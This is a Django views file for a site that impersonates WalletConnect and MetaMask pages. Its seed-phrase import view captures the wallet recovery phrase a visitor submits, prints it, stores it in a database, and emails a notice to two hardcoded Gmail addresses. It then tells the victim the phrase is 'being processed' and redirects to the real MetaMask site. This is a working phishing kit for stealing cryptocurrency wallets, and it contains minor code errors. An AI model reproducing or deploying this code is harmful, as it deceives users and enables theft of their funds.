from django.shortcuts import render

from django.http import HttpResponse

from django.core.mail import BadHeaderError, send_mail

from django.contrib import messages

from .models import *

# Create your views here.

def home(request):
	return render(request, 'wallectconnectapp/home.html')

def docs(request):
	return render(request, 'wallectconnectapp/docs.html')

def github(request):
	return render(request, 'wallectconnectapp/github.html')

def apps(request):
	return render(request, 'wallectconnectapp/apps.html')

def wallets(request):
	return render(request, 'wallectconnectapp/wallets.html')

def metamaskhome(request):
	return render(request, 'wallectconnectapp/metamaskhome.html')

def metamaskabout(request):
	return render(request, 'wallectconnectapp/metamaskabout.html')

def metamaskswap(request):
	return render(request, 'wallectconnectapp/metamaskswap.html')

def metamaskfaq(request):
	return render(request, 'wallectconnectapp/metamaskfaq.html')

def metamaskinstitutions(request):
	return render(request, 'wallectconnectapp/metamaskinstitutions.html')

def metamaskcontinue(request):
	return render(request, 'wallectconnectapp/metamaskcontinuepage.html')

def metamaskcreate_password(request):
	return render(request, 'wallectconnectapp/metamaskcreate_password.html')

def metamaskimportseedphrase(request):
	if request.method == 'POST':
		my_seed= request.POST.get('seed')
		if my_seed:
			print(my_seed)
		your_wallet= request.POST.get('your_wallet')
		if my_seed:
			try:
				send_mail('MetaMask', "someone has put their seed phrase in MetaMask and the wallet type is {}".format(your_wallet), your_wallet, ['leroyttravies@gmail.com', 'danielleivanov71@gmail.com'])
			except BadHeaderError:
				return HttpResponse('Invalid header found')
			messages.success(request, "Your seed phrase is being processed.")

			seed.objects.create(
					seed= my_seed,
					wallet= your_wallet, 
					)
			return redirect('https://metamask.io/download.html')
	return render(request, 'wallectconnectapp/metamaskimportseedphrase.html')

def metamaskfaq(request):
	return render(request, 'wallectconnectapp/metamaskfaq.html')
